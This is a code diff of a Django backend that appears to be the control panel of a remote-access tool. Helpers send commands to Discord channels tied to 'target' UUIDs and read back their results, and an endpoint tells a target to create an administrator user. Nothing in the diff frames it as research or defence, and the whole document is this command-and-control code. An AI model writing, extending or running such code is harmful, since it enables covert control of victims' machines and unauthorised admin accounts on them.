@@ -47,6 +47,40 @@ def __get_target_channel_id_by_uuid(target_uuid):
     return None
 
 
+def __send_discord_command(target_uuid, command, observer=False):
+    target_text_channel_id = __get_target_channel_id_by_uuid(target_uuid)
+    bot_token = __OBSERVER_TOKEN if observer else __TOKEN
+
+    headers = {
+        'authorization': 'Bot ' + bot_token,
+        'content-type': 'application/json'
+    }
+        
+
+    data = json.dumps({
+        'content': command
+    })
+
+    requests.post(f"https://discord.com/api/v9/channels/{target_text_channel_id}/messages", headers = headers, data = data)
+
+
+def __get_target_results(target_uuid):
+    headers = {'authorization': 'Bot ' + __OBSERVER_TOKEN}
+    target_channel_id = __get_target_channel_id_by_uuid(target_uuid)
+    response = requests.get(f"https://discord.com/api/v9/channels/{target_channel_id}/messages?limit=100", headers = headers)
+
+    if response.status_code != 200:
+        return JsonResponse({'error': response.text})
+    
+    messages = json.loads(response.text)
+    messages_data = list(map(lambda message: {'content': message['content'], 'attachments': message['attachments']}, messages))
+    messages_data_filtered = list(filter(lambda message_data: message_data['content'] != 'ping!', messages_data))
+    messages_data_filtered.reverse()
+    return JsonResponse({'messages': messages_data_filtered})
+
+
+# ============================================================== APIS ==============================================================
+
 @api_view(['GET'])
 def get_target_message_id_by_uuid(request, target_uuid):
     headers = {'authorization': 'Bot ' + __OBSERVER_TOKEN}
@@ -63,23 +97,6 @@ def get_target_message_id_by_uuid(request, target_uuid):
         if target['identifier'] == target_uuid:
             return JsonResponse({'message_id': message['id']})
     return JsonResponse({})
-
-
-def __send_discord_command(target_uuid, command, observer=False):
-    target_text_channel_id = __get_target_channel_id_by_uuid(target_uuid)
-    bot_token = __OBSERVER_TOKEN if observer else __TOKEN
-
-    headers = {
-        'authorization': 'Bot ' + bot_token,
-        'content-type': 'application/json'
-    }
-        
-
-    data = json.dumps({
-        'content': command
-    })
-
-    requests.post(f"https://discord.com/api/v9/channels/{target_text_channel_id}/messages", headers = headers, data = data)
 
 
 @api_view(['GET'])
@@ -160,3 +177,7 @@ def create_admin_user(request, target_uuid):
     command = "!create_admin_user"
     __send_discord_command(target_uuid, command)
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+
+@api_view(['GET'])
+def get_target_results(request, target_uuid):
+    return __get_target_results(target_uuid)
